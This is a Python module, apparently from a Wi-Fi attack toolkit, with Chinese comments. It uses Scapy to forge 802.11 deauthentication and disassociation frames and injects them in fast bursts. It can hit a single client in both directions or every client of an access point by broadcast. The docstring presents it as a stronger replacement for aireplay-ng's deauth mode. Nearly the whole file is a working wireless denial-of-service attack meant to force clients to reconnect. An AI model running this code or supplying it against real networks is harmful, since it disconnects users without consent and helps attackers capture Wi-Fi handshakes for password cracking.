#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Scapy 层 2 deauth / disassoc 注入（辅助 aireplay）。

部分 USB 网卡上 aireplay-ng -0 发送次数少、速率低，体感「力度不够」。
Scapy 直接构造 802.11 管理帧，可：
  - 双向 deauth（AP↔STA）
  - 双向 disassoc（部分客户端更敏感）
  - 广播 + 单播
  - 更高突发计数、更短帧间隔

依赖可选：python3-scapy（Kali: apt install python3-scapy）。
无 scapy 时静默不可用，不影响主流程。
"""

from __future__ import annotations

from typing import Optional

from ..config import Configuration
from ..util.validate import is_mac_address, is_safe_iface


class ScapyDeauth(object):
    dependency_name = 'scapy'
    dependency_url = 'https://scapy.net/ (Kali: apt install python3-scapy)'

    _scapy = None
    _checked = False

    @classmethod
    def available(cls) -> bool:
        if cls._checked:
            return cls._scapy is not None
        cls._checked = True
        try:
            from scapy.all import (  # type: ignore
                RadioTap, Dot11, Dot11Deauth, Dot11Disas, sendp,
            )
            cls._scapy = {
                'RadioTap': RadioTap,
                'Dot11': Dot11,
                'Dot11Deauth': Dot11Deauth,
                'Dot11Disas': Dot11Disas,
                'sendp': sendp,
            }
            return True
        except Exception:
            cls._scapy = None
            return False

    @classmethod
    def fails_dependency_check(cls) -> bool:
        # 可选依赖，不阻断启动
        return False

    @staticmethod
    def _norm_mac(mac: Optional[str]) -> Optional[str]:
        if not mac:
            return None
        m = mac.strip().lower()
        return m if is_mac_address(m) else None

    @classmethod
    def deauth(
        cls,
        target_bssid: str,
        client_mac: Optional[str] = None,
        count: Optional[int] = None,
        iface: Optional[str] = None,
        inter: Optional[float] = None,
    ) -> int:
        """注入 deauth+disassoc。返回尝试发送的帧数（失败 0）。"""
        if not cls.available():
            return 0

        bssid = cls._norm_mac(target_bssid)
        if not bssid:
            return 0
        # 显式传了 client 但非法 → 拒绝（避免静默变成广播）
        if client_mac is not None and str(client_mac).strip():
            client = cls._norm_mac(client_mac)
            if not client:
                return 0
        else:
            client = None

        iface = iface or Configuration.interface
        if not iface or not is_safe_iface(iface):
            return 0

        try:
            burst = int(count if count is not None
                        else getattr(Configuration, 'scapy_deauth_count', 32) or 32)
        except (TypeError, ValueError):
            burst = 32
        burst = max(4, min(burst, 256))

        try:
            gap = float(inter if inter is not None
                        else getattr(Configuration, 'scapy_deauth_inter', 0.002) or 0.002)
        except (TypeError, ValueError):
            gap = 0.002
        gap = max(0.0, min(gap, 0.05))

        S = cls._scapy
        RadioTap = S['RadioTap']
        Dot11 = S['Dot11']
        Dot11Deauth = S['Dot11Deauth']
        Dot11Disas = S['Dot11Disas']
        sendp = S['sendp']

        # reason=7 Class 3 frame received from nonassociated STA（常用触发重关联）
        reason = int(getattr(Configuration, 'scapy_deauth_reason', 7) or 7)
        bc = 'ff:ff:ff:ff:ff:ff'
        frames = []

        def _deauth(da: str, sa: str, bssid_addr: str):
            return (RadioTap()
                    / Dot11(type=0, subtype=12, addr1=da, addr2=sa, addr3=bssid_addr)
                    / Dot11Deauth(reason=reason))

        def _disas(da: str, sa: str, bssid_addr: str):
            return (RadioTap()
                    / Dot11(type=0, subtype=10, addr1=da, addr2=sa, addr3=bssid_addr)
                    / Dot11Disas(reason=reason))

        if client:
            # 双向：AP→STA 与 STA→AP（不少驱动只吃一侧）
            frames.extend([
                _deauth(client, bssid, bssid),
                _deauth(bssid, client, bssid),
                _disas(client, bssid, bssid),
                _disas(bssid, client, bssid),
            ])
        else:
            # 广播 deauth/disassoc（踢所有关联站）
            frames.extend([
                _deauth(bc, bssid, bssid),
                _disas(bc, bssid, bssid),
            ])

        sent = 0
        try:
            for pkt in frames:
                sendp(
                    pkt,
                    iface=iface,
                    count=burst,
                    inter=gap,
                    verbose=0,
                )
                sent += burst
        except Exception:
            # 注入失败（驱动/权限/接口）→ 0，外层回退 aireplay
            return 0
        return sent
